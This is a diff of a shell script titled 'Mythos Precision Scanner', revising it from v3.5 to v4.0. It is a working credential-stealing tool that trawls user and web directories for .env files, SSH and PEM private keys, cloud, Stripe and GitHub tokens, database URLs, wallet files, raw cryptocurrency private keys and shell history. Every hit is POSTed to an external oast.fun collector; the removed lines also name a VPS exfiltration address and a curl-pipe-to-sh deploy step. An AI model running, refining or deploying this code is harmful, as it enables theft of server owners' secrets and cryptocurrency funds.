@@ -1,286 +1,212 @@
 #!/bin/sh
-# Mythos Precision Scanner v3.5 — local file output for Sliver download, no BIP39
-# Deploy: curl -sL URL | sh
-# Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun
-
+# Mythos Precision Scanner v4.0 — User-dir focused, no system junk
 OAST="fzxlsopmyfsfmcutpfapj7u3fu0t92jtj.oast.fun"
-VPS="153.75.248.248:9999"
 HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
 USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")
-# Truncate output file for fresh scan
+
+# === TARGET: only user/project dirs, not system ===
+TARGETS=""
+for d in /root /home/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
+for d in /var/www /var/www/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
+[ -z "$TARGETS" ] && TARGETS="/root /home /var/www"
+
+send() { local s="$1" d="$2"
+    local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '|' | cut -c1-3000)"
+    echo "$p" >> /tmp/.mqs_out
+    curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
+}
 > /tmp/.mqs_out
 
 ###############################################################################
-# IGNORE LIST — directories and file patterns to skip
+# SCAN: only small text files, skip binaries/images/css/js-bundles/minified
 ###############################################################################
-IGNORE_DIRS="\
--path '*/node_modules' -prune -o \
--path '*/.git' -prune -o \
--path '*/vendor' -prune -o \
--path '*/cache' -prune -o \
--path '*/tmp/cache' -prune -o \
--path '*/bower_components' -prune -o \
--path '*/dist' -prune -o \
--path '*/build' -prune -o \
--path '*/__pycache__' -prune -o \
--path '*/egg-info' -prune -o \
--path '*/package-lock.json' -prune -o \
--path '*/yarn.lock' -prune -o \
--path '*/composer.lock' -prune -o \
--path '*/Gemfile.lock' -prune -o \
--path '*/.cache' -prune -o \
--path '*/storage/framework' -prune -o \
--path '*/storage/logs' -prune -o \
--path '*/var/cache' -prune -o \
--path '*/var/log' -prune -o \
--path '/proc' -prune -o \
--path '/sys' -prune -o \
--path '/dev' -prune -o \
--path '/run' -prune -o \
--path '/snap' -prune -o \
--path '*/public/uploads' -prune -o \
--path '*/wp-content/uploads' -prune -o \
--path '*/media' -prune -o \
--path '*/assets' -prune -o \
--path '*/fonts' -prune -o \
--path '*/images' -prune -o \
--path '*/img' -prune -o \
--path '*/css' -prune -o \
--path '*/js/build' -prune -o \
--path '*/coverage' -prune -o \
--path '*/test' -prune -o \
--path '*/tests' -prune -o \
--path '*/spec' -prune -o \
--path '*/venv' -prune -o \
--path '*/.venv' -prune -o \
--path '*/virtualenv' -prune -o \
--path '*/env' -prune -o \
--path '*/obj' -prune -o \
--path '*/bin' -prune -o \
--path '*/objets' -prune -o \
--path '*/Debug' -prune -o \
--path '*/Release' -prune -o \
--path '*/.terraform' -prune -o \
--path '*/terraform.tfstate*' -prune -o \
--path '*/__MACOSX' -prune -o \
--path '*/.DS_Store' -prune -o \
--path '*/thumbs.db' -prune -o \
--path '*/Thumbs.db' -prune -o"
-
-# Base find command prefix (with ignore list inline)
-FIND_BASE="find /var/www /home /root /opt /srv /app /etc /tmp -maxdepth 6 \
-$IGNORE_DIRS \
--type f"
-
-FIND_DEEP="find /var/www /home /root /opt /srv /app /etc /tmp -maxdepth 8 \
-$IGNORE_DIRS \
--type f"
-
-###############################################################################
-send() {
-    local s="$1" d="$2"
-    local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '|' | cut -c1-3000)"
-    # Save locally on host (for Sliver download to VPS)
-    echo "$p" >> /tmp/.mqs_out
-    # oast.fun (bypasses firewalls)
-    curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
-    # VPS collector (fast path for hosts that can reach it)
-    curl -s -m 2 -X POST --data-binary "$p" "http://${VPS}/" 2>/dev/null &
+scan_files() {
+    local pattern="$1" maxsize="${2:-2M}"
+    find $TARGETS -maxdepth 6 -type f -size -$maxsize \
+        ! -name "*.css" ! -name "*.scss" ! -name "*.less" \
+        ! -name "*.jpg" ! -name "*.jpeg" ! -name "*.png" ! -name "*.gif" \
+        ! -name "*.svg" ! -name "*.ico" ! -name "*.webp" ! -name "*.bmp" \
+        ! -name "*.woff" ! -name "*.woff2" ! -name "*.ttf" ! -name "*.eot" \
+        ! -name "*.mp3" ! -name "*.mp4" ! -name "*.avi" ! -name "*.mov" \
+        ! -name "*.zip" ! -name "*.tar" ! -name "*.gz" ! -name "*.bz2" \
+        ! -name "*.exe" ! -name "*.dll" ! -name "*.so" ! -name "*.a" \
+        ! -name "*.o" ! -name "*.class" ! -name "*.pyc" ! -name "*.pyo" \
+        ! -name "*.min.js" ! -name "*.min.css" ! -name "*.bundle.js" \
+        ! -name "*.chunk.js" ! -name "*.map" \
+        ! -name "package-lock.json" ! -name "yarn.lock" ! -name "composer.lock" \
+        ! -path "*/node_modules/*" ! -path "*/.git/*" ! -path "*/vendor/*" \
+        ! -path "*/cache/*" ! -path "*/dist/*" ! -path "*/build/*" \
+        ! -path "*/__pycache__/*" ! -path "*/.cache/*" \
+        ! -path "*/storage/framework/*" ! -path "*/storage/logs/*" \
+        ! -path "*/public/uploads/*" ! -path "*/wp-content/uploads/*" \
+        ! -path "*/assets/*" ! -path "*/fonts/*" ! -path "*/images/*" \
+        ! -path "*/.terraform/*" ! -path "*/coverage/*" \
+        -name "$pattern" 2>/dev/null
 }
 
 ###############################################################################
-# 1. .ENV FILES — skip node_modules, vendor, cache
+# 1. .ENV FILES — direct content grab
 ###############################################################################
-(eval "$FIND_BASE \( -name '.env' -o -name '.env.*' -o -name '*.env' \)" 2>/dev/null | head -200 | while read f; do
-    send "ENVFILE" "${f}:$(head -c 4096 "$f" 2>/dev/null | tr '\n' '|')"
-done) &
-
-###############################################################################
-# 2. ETHEREUM PRIVATE KEY — ultra-strict: only files with ETH context
-###############################################################################
-(eval "$FIND_DEEP \( -name '*.txt' -o -name '.env*' -o -name '*.key' -o -name '*.json' \) -size -1M" 2>/dev/null | while read f; do
-    # STRICT: file must contain ETH-related context
-    grep -qilE 'private.key|ethereum|eth_key|ETH_KEY|ETHEREUM|0x[0-9a-fA-F]{40}' "$f" 2>/dev/null || continue
-    grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | while read key; do
-        # Reject known false patterns
-        echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|^a{64}$|^A{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000|123456|abcdef|fedcba' && continue
-        first=$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')
-        [ "$first" = "f" ] && continue
-        send "ETHKEY" "${f}:${key}"
+for d in $TARGETS; do
+    find "$d" -maxdepth 6 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" \) \
+        ! -path "*/node_modules/*" ! -path "*/vendor/*" -size -1M 2>/dev/null | head -100 | while read f; do
+        send "ENV" "$f:$(head -c 4096 "$f" 2>/dev/null)"
     done
-done) &
+done &
 
 ###############################################################################
-# 4. SOLANA base58 private key — 87-88 chars, base58 charset (no 0OIl)
-# Only from relevant source files
+# 2. SSH PRIVATE KEYS — only actual private keys
 ###############################################################################
-(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.json' -o -name '.env*' -o -name '*.key' \
-    -o -name '*.cfg' -o -name 'id.json' -o -name '*solana*' -o -name '*phantom*' \) -size -5M" 2>/dev/null | while read f; do
-    # base58 charset: [1-9A-HJ-NP-Za-km-z] — no 0, O, I, l
-    grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | head -2 | while read key; do
-        send "SOLKEY_B58" "${f}:${key}"
+for d in /root /home/*; do
+    find "$d" -maxdepth 5 -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \) \
+        2>/dev/null | while read f; do
+        grep -q 'PRIVATE KEY' "$f" 2>/dev/null && send "SSH" "$(head -c 4096 "$f")"
     done
-done) &
+done &
 
 ###############################################################################
-# 5. SOLANA JSON array — [num,num,...,num] with ~64 bytes (0-255)
+# 3. .PEM FILES — only in SSH or project dirs (not system /etc/ssl)
 ###############################################################################
-(eval "$FIND_DEEP \( -name '*.json' -o -name '*.txt' -o -name '*.key' -o -name 'id.json' \) -size -1M" 2>/dev/null | while read f; do
-    grep -oE '\[[[:space:]]*[0-9]{1,3}([[:space:]]*,[[:space:]]*[0-9]{1,3}){63}[[:space:]]*\]' "$f" 2>/dev/null | while read arr; do
-        nums=$(echo "$arr" | grep -oE '[0-9]+')
-        count=$(echo "$nums" | wc -l)
-        [ "$count" -lt 62 ] || [ "$count" -gt 66 ] && continue
-        # Validate all numbers are 0-255
-        bad=0
-        for n in $(echo "$nums"); do
-            [ "$n" -gt 255 ] 2>/dev/null && { bad=1; break; }
-        done
-        [ "$bad" -eq 0 ] && send "SOLKEY_JSON" "${f}:${arr}"
+for d in /root/.ssh /home/*/.ssh $TARGETS; do
+    find "$d" -maxdepth 4 -type f -name "*.pem" ! -path "*/ssl/*" ! -path "*/certs/*" 2>/dev/null | while read f; do
+        grep -q 'PRIVATE KEY' "$f" 2>/dev/null && send "PEM" "$(head -c 4096 "$f")"
     done
-done) &
+done &
 
 ###############################################################################
-# 6. BITCOIN WIF — starts with 5/K/L, 51-52 base58 chars
+# 4. STRIPE KEYS — in .env and config files only
 ###############################################################################
-(eval "$FIND_DEEP \( -name '*.txt' -o -name '*.json' -o -name '.env*' -o -name '*.key' -o -name '*.cfg' \) -size -5M" 2>/dev/null | while read f; do
-    # WIF: 5/K/L + 50-51 base58 chars = 51-52 total
-    grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | head -2 | while read key; do
-        send "BTCWIF" "${f}:${key}"
+scan_files "*.env*" | while read f; do
+    grep -oE '\b(sk_live_[a-zA-Z0-9]{24,99}|rk_live_[a-zA-Z0-9]{24,99}|whsec_[a-zA-Z0-9]{32,99})\b' "$f" 2>/dev/null | while read k; do
+        send "STRIPE" "$f:$k"
     done
-done) &
+done &
 
 ###############################################################################
-# 7. CRYPTO WALLET FILES — by filename (high confidence)
+# 5. GITHUB TOKENS — .env, .npmrc, .gitconfig, .bash_history only
 ###############################################################################
-(eval "$FIND_BASE \( -name 'wallet.dat' -o -name 'wallet.json' -o -name '*.wallet' \
-    -o -name 'keystore' -o -name 'UTC--*' -o -name '*metamask*' -o -name '*phantom*' \
-    -o -name '*solana*' -o -name '*trustwallet*' -o -name '*exodus*' -o -name 'id.json' \
-    -o -name '*.keyfile' -o -name 'seed.txt' -o -name 'seed*' \)" 2>/dev/null | while read f; do
-    send "CRYPTOFILE" "$(head -c 8192 "$f" 2>/dev/null)"
-done) &
-
-###############################################################################
-# 8. STRIPE KEYS — sk_live_, rk_live_, whsec_, pk_live_
-# Pattern validated: sk_live_ + 24+ alphanum, rk_live_ + 24+, whsec_ + 32+
-###############################################################################
-(eval "$FIND_BASE \( -name '.env*' -o -name '*.php' -o -name '*.js' -o -name '*.py' \
-    -o -name '*.json' -o -name '*.yml' -o -name '*.yaml' -o -name '*.cfg' -o -name '*.conf' \
-    -o -name '*.txt' \)" 2>/dev/null | xargs grep -lIE 'sk_live_|rk_live_|whsec_' 2>/dev/null | head -30 | while read f; do
-    grep -oIE '\b(sk_live_[a-zA-Z0-9]{24,99}|rk_live_[a-zA-Z0-9]{24,99}|whsec_[a-zA-Z0-9]{32,99}|pk_live_[a-zA-Z0-9]{24,99})\b' "$f" 2>/dev/null | while read key; do
-        send "STRIPE" "${f}:${key}"
+scan_files "*.env*" > /tmp/.gh_files
+scan_files ".npmrc" >> /tmp/.gh_files
+scan_files ".gitconfig" >> /tmp/.gh_files
+scan_files ".bash_history" >> /tmp/.gh_files
+scan_files ".git-credentials" >> /tmp/.gh_files
+cat /tmp/.gh_files 2>/dev/null | sort -u | while read f; do
+    grep -oE '\b(ghp_[a-zA-Z0-9]{36,50}|github_pat_[a-zA-Z0-9_]{40,100})\b' "$f" 2>/dev/null | while read k; do
+        send "GITHUB" "$f:$k"
     done
-done) &
+done &
+rm -f /tmp/.gh_files
 
 ###############################################################################
-# 9. GITHUB TOKENS — ghp_, github_pat_, gho_
+# 6. AWS KEYS — .env, .aws/credentials
 ###############################################################################
-(eval "$FIND_BASE \( -name '.env*' -o -name '*.php' -o -name '*.js' -o -name '*.py' \
-    -o -name '*.json' -o -name '*.yml' -o -name '*.yaml' -o -name '*.cfg' -o -name '*.conf' \
-    -o -name '.bash_history' -o -name '.npmrc' -o -name '.gitconfig' \)" 2>/dev/null | \
-    xargs grep -lIE 'ghp_|github_pat_|gho_' 2>/dev/null | head -30 | while read f; do
-    grep -oIE '\b(ghp_[a-zA-Z0-9]{36,50}|github_pat_[a-zA-Z0-9_]{40,100}|gho_[a-zA-Z0-9]{36,50})\b' "$f" 2>/dev/null | while read tok; do
-        send "GITHUB" "${f}:${tok}"
+scan_files "*.env*" | while read f; do
+    grep -oE '\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\b' "$f" 2>/dev/null | while read k; do
+        send "AWS" "$f:$k"
     done
-done) &
-
-###############################################################################
-# 10. AWS KEYS — AKIA/ASIA + 16 uppercase
-###############################################################################
-(eval "$FIND_BASE \( -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '*.json' \)" 2>/dev/null | \
-    xargs grep -lE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' 2>/dev/null | head -20 | while read f; do
-    grep -oE '\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\b' "$f" 2>/dev/null | while read key; do
-        send "AWSKEY" "${f}:${key}"
-    done
-done) &
-
-# AWS credentials files
+done &
 for d in /root/.aws /home/*/.aws; do
-    [ -f "$d/credentials" ] && send "AWSCRED" "$(head -c 4096 "$d/credentials" 2>/dev/null)"
-    [ -f "$d/config" ] && send "AWSCFG" "$(head -c 2048 "$d/config" 2>/dev/null)"
+    [ -f "$d/credentials" ] && send "AWS_CRED" "$(head -c 4096 "$d/credentials")"
 done &
 
 ###############################################################################
-# 11. GCP — service account JSON (validated: must contain "type": "service_account")
+# 7. GCP SERVICE ACCOUNT JSONs — only in user dirs, check "service_account"
 ###############################################################################
-(eval "$FIND_DEEP \( -name '*.json' \)" 2>/dev/null | while read f; do
-    grep -q '"type":.*"service_account"' "$f" 2>/dev/null && send "GCPKEY" "$(head -c 4096 "$f" 2>/dev/null)"
-done) &
-
-for d in /root/.config/gcloud /home/*/.config/gcloud; do
-    [ -d "$d" ] && find "$d" -name "*.json" -type f 2>/dev/null | while read f; do
-        send "GCPJSON" "$(head -c 2048 "$f" 2>/dev/null)"
+for d in $TARGETS; do
+    find "$d" -maxdepth 6 -type f -name "*.json" -size -1M 2>/dev/null | while read f; do
+        grep -q '"type".*:.*"service_account"' "$f" 2>/dev/null && send "GCP" "$(head -c 4096 "$f")"
     done
 done &
 
 ###############################################################################
-# 12. SSH KEYS — id_rsa, id_ed25519, id_ecdsa, *.pem
-# 12. SSH KEYS — only actual PRIVATE keys (not certificates)
-(eval "$FIND_BASE \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' \)" 2>/dev/null | while read f; do
-    # Only send if it's actually a private key
-    grep -q 'PRIVATE KEY' "$f" 2>/dev/null && send "SSHKEY" "$(head -c 4096 "$f" 2>/dev/null)"
-done) &
-
+# 8. DATABASE URLs — .env files only
 ###############################################################################
-# 13. DATABASE URLs — validated pattern: scheme://user:pass@host/db
-###############################################################################
-(eval "$FIND_BASE \( -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' \)" 2>/dev/null | \
-    xargs grep -lE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|MYSQL_URL|POSTGRES_URL|POSTGRESQL_URL).*://[^@]+@' 2>/dev/null | head -20 | while read f; do
-    grep -oE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|MYSQL_URL|POSTGRES_URL|POSTGRESQL_URL)[^[:space:]]*://[^[:space:]]*@[^[:space:]]+' "$f" 2>/dev/null | while read url; do
-        send "DBURL" "${f}:${url}"
+scan_files "*.env*" | while read f; do
+    grep -oiE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|POSTGRES_URL|MYSQL_URL)[^[:space:]]*://[^[:space:]]*@[^[:space:]]+' "$f" 2>/dev/null | while read u; do
+        send "DB" "$f:$u"
     done
-done) &
+done &
 
 ###############################################################################
-# 14. DOCKER / GIT / NPM / K8S / WORDPRESS
+# 9. CRYPTO WALLET FILES — by filename (high confidence, low FP)
+###############################################################################
+for d in $TARGETS; do
+    find "$d" -maxdepth 5 -type f -size -5M \
+        \( -name "wallet.dat" -o -name "wallet.json" -o -name "*.wallet" \
+        -o -name "keystore" -o -name "UTC--*" \) 2>/dev/null | while read f; do
+        send "CRYPTO" "$(head -c 8192 "$f")"
+    done
+done &
+
+###############################################################################
+# 10. ETHEREUM PRIVATE KEY — strict: only in .env, *.key, files with "ETH" context
+###############################################################################
+scan_files "*.env*" > /tmp/.eth_files
+scan_files "*.key" >> /tmp/.eth_files
+scan_files "*.txt" >> /tmp/.eth_files
+cat /tmp/.eth_files 2>/dev/null | sort -u | while read f; do
+    grep -qilE 'ETH|ethereum|private.key|PRIVATE_KEY|0x[0-9a-fA-F]{40}' "$f" 2>/dev/null || continue
+    grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | while read key; do
+        echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000|123456|abcdef|fedcba' && continue
+        [ "$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')" = "f" ] && continue
+        send "ETH" "$f:$key"
+    done
+done &
+rm -f /tmp/.eth_files
+
+###############################################################################
+# 11. SOLANA base58 — only files with solana/phantom context
+###############################################################################
+for d in $TARGETS; do
+    find "$d" -maxdepth 5 -type f -size -1M \
+        \( -name "*.json" -o -name "*.txt" -o -name "*.key" -o -name ".env*" \) \
+        ! -path "*/node_modules/*" 2>/dev/null | while read f; do
+        grep -qilE 'solana|phantom|SOLANA' "$f" 2>/dev/null || continue
+        grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | head -2 | while read k; do
+            send "SOL" "$f:$k"
+        done
+    done
+done &
+
+###############################################################################
+# 12. BITCOIN WIF
+###############################################################################
+scan_files "*.txt" | while read f; do
+    grep -qilE 'bitcoin|BTC|wallet|WIF|private' "$f" 2>/dev/null || continue
+    grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | head -2 | while read k; do
+        send "BTC" "$f:$k"
+    done
+done &
+
+###############################################################################
+# 13. DOCKER / GIT / NPM — config files only
 ###############################################################################
 for d in /root/.docker /home/*/.docker; do
-    [ -f "$d/config.json" ] && send "DOCKER" "$(head -c 4096 "$d/config.json" 2>/dev/null)"
+    [ -f "$d/config.json" ] && send "DOCKER" "$(head -c 4096 "$d/config.json")"
+done &
+for d in /root /home/*; do
+    [ -f "$d/.git-credentials" ] && send "GITCRED" "$(head -c 2048 "$d/.git-credentials")"
+    [ -f "$d/.npmrc" ] && send "NPMRC" "$(head -c 2048 "$d/.npmrc")"
 done &
 
-(eval "$FIND_BASE \( -name '.git-credentials' -o -name '.npmrc' \)" 2>/dev/null | while read f; do
-    case "$f" in
-        *.git-credentials) send "GITCRED" "$(head -c 2048 "$f" 2>/dev/null)" ;;
-        *.npmrc) send "NPMRC" "$(head -c 2048 "$f" 2>/dev/null)" ;;
-    esac
-done) &
-
-# K8s configs (no ignore — kube dirs are outside standard scan paths anyway)
-for d in /root/.kube /home/*/.kube; do
-    [ -d "$d" ] && find "$d" -type f 2>/dev/null | while read f; do
-        send "K8S" "$(head -c 4096 "$f" 2>/dev/null)"
-    done
-done &
-
-# WordPress (wp-config.php)
-(eval "$FIND_BASE -name 'wp-config.php'" 2>/dev/null | while read f; do
-    c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY' "$f" 2>/dev/null | tr '\n' '|')
-    [ -n "$c" ] && send "WPCONFIG" "${f}:${c}"
-done) &
-
 ###############################################################################
-# 15. SHELL HISTORY — passwords and tokens
+# 14. SHELL HISTORY — only cred-related lines
 ###############################################################################
-for h in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history; do
-    [ -f "$h" ] && grep -iE 'password|secret|token|key|ghp_|github_pat|sk_live|AKIA|DATABASE_URL|export.*=' "$h" 2>/dev/null | tail -50 | while read l; do
-        send "HISTORY" "$l"
+for h in /root/.bash_history /home/*/.bash_history; do
+    [ -f "$h" ] && grep -iE 'password|secret|token|ghp_|github_pat|sk_live|AKIA|DATABASE_URL|ssh-keygen|aws.configure' "$h" 2>/dev/null | tail -30 | while read l; do
+        send "HIST" "$l"
     done
 done &
 
 ###############################################################################
-# 16. GITLAB / SENDGRID / SLACK / TWILIO — validated patterns
+# 15. WORDPRESS wp-config
 ###############################################################################
-(eval "$FIND_BASE \( -name '.env*' -o -name '*.cfg' -o -name '*.conf' -o -name '*.json' \)" 2>/dev/null | \
-    xargs grep -lE 'glpat-|SG\.|xox[bprs]-|SK[0-9a-fA-F]{32}' 2>/dev/null | head -15 | while read f; do
-    grep -oE '\b(glpat-[a-zA-Z0-9\-]{20,50}|SG\.[a-zA-Z0-9_\-]{20,99}\.[a-zA-Z0-9_\-]{20,99}|xox[bprs]-[0-9]{10,99}-[a-zA-Z0-9]+|SK[0-9a-fA-F]{32})\b' "$f" 2>/dev/null | while read key; do
-        send "SAASKEY" "${f}:${key}"
+for d in $TARGETS; do
+    find "$d" -maxdepth 6 -type f -name "wp-config.php" 2>/dev/null | while read f; do
+        c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD' "$f" 2>/dev/null | tr '\n' '|')
+        [ -n "$c" ] && send "WP" "$f:$c"
     done
-done) &
+done &
 
-###############################################################################
-# WAIT + SUMMARY
-###############################################################################
 wait
-env_cnt=$(eval "$FIND_BASE -name '.env*'" 2>/dev/null | wc -l)
-ssh_cnt=$(eval "$FIND_BASE \( -name 'id_rsa' -o -name 'id_ed25519' \)" 2>/dev/null | wc -l)
-send "SUMMARY" "host=${HOST}|user=${USER}|env=${env_cnt}|ssh=${ssh_cnt}"
-rm -rf /tmp/.mqs_* 2>/dev/null
+rm -f /tmp/.eth_files /tmp/.gh_files /tmp/.mqs_*
